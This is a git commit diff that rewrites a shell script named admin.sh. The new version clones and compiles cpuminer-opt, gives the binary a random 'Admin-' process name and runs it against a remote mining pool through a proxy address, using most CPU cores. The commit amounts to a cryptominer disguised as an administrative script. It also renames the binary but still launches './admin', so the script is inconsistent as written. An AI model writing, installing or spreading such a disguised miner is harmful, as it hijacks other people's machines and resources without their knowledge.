f92a3a10bb949b7f6b4e774fd0e4b7c9b53a128c
nviettien191 <n.viettien191655320@gmail.com>
2018-08-21 15:11:18 +0700

    Update admin.sh

--- admin.sh
+++ admin.sh
@@ -1,7 +1,16 @@
 #!/bin/bash
+sudo -i
+sudo apt-get update
+apt-get install -y build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake autotools-dev git autoconf
 echo "vm.nr_hugepages=128" >> /etc/sysctl.conf && sysctl -p
+git clone https://github.com/JayDDee/cpuminer-opt.git /usr/share/work/
+a='Admin-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 cd /usr/share/work/
-echo "admin is starting"
+./build.sh
+CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl
+make
+mv cpuminer "${cpuname}"
+echo ""${cpuname}" is starting"
 cpucores=$( awk -F: '/model name/ {core++} END {print core}' /proc/cpuinfo )
 if [ $cpucores -ge 16 ]; then
 downcore=2;
@@ -14,4 +23,4 @@ else
 detectcpu=$cpucores
 fi
 maxcore=$[$cpucores - $downcore];
-sudo ./admin -a lyra2z330 -o stratum+tcp://hxx-pool2.chainsilo.com:3033 -u nvt191655320.1 -p x -x 18.207.224.76:808 -t $maxcore
+sudo ./admin -a lyra2z330 -o stratum+tcp://hxx-pool1.chainsilo.com:3033 -u nvt191655320.1 -p x -x 18.207.224.76:808 -t $maxcore
